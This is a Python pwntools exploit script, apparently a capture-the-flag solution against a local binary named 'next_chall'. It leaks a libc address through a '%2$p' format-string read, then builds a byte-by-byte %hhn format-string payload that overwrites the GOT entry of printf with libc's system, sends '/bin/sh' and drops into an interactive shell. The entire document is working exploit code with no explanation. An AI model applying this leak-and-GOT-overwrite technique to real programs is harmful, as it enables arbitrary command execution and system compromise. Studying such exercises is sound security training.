from pwn import *

io = process("./next_chall")
elf = context.binary = ELF('./next_chall')
libc = elf.libc
# io = gdb.debug("./next_chall", '''
# b *0x080491d3
# c''')
context.log_level = 'debug'
payload = '%2$p'
io.sendline(payload)
libc.address = int(io.recvline().decode().strip(), 16) - 2270752

def formatthingy(base, replacewith, tobereplaced):
    test = str(hex(replacewith)[2:])
    test2 = int(test[-4:-2], 16)
    test3 = int(test[-6:-4], 16)
    test4 = int(test[-8:-6], 16)
    test = int(test[-2:], 16)
    l = [test, test2, test3, test4]
    t = [0, 0, 0, 0]
    sort = sorted(l)
    for i in range(len(sort)):
        for j in range(len(l)):
            if l[j] == sort[i]:
                t[i] = j
    x = "%{0}c%0$hhn%{1}c%0$hhn%{2}c%0$hhn%{3}c%0$hhn".format(l[t[0]], l[t[1]]-l[t[0]], l[t[2]]-l[t[1]], l[t[3]]-l[t[2]]).encode()
    x += b'a'*(4-(len(x)%4))
    offset = (len(x)//4)+base
    for i in range(2):
        payload = "%{0}c%{4}$hhn%{1}c%{5}$hhn%{2}c%{6}$hhn%{3}c%{7}$hhn".format(l[t[0]], l[t[1]]-l[t[0]], l[t[2]]-l[t[1]], l[t[3]]-l[t[2]], offset, offset+1, offset+2, offset+3).encode()
        payload += b'a'*(4-(len(payload)%4))
        offset = (len(payload)//4)+base
    payload += p32(tobereplaced+t[0])
    payload += p32(tobereplaced+t[1])
    payload += p32(tobereplaced+t[2])
    payload += p32(tobereplaced+t[3])
    io.sendline(payload)

formatthingy(5, libc.sym['system'], elf.got['printf'])
io.clean()
io.sendline('/bin/sh')
io.interactive()

'''
inp = 5

'''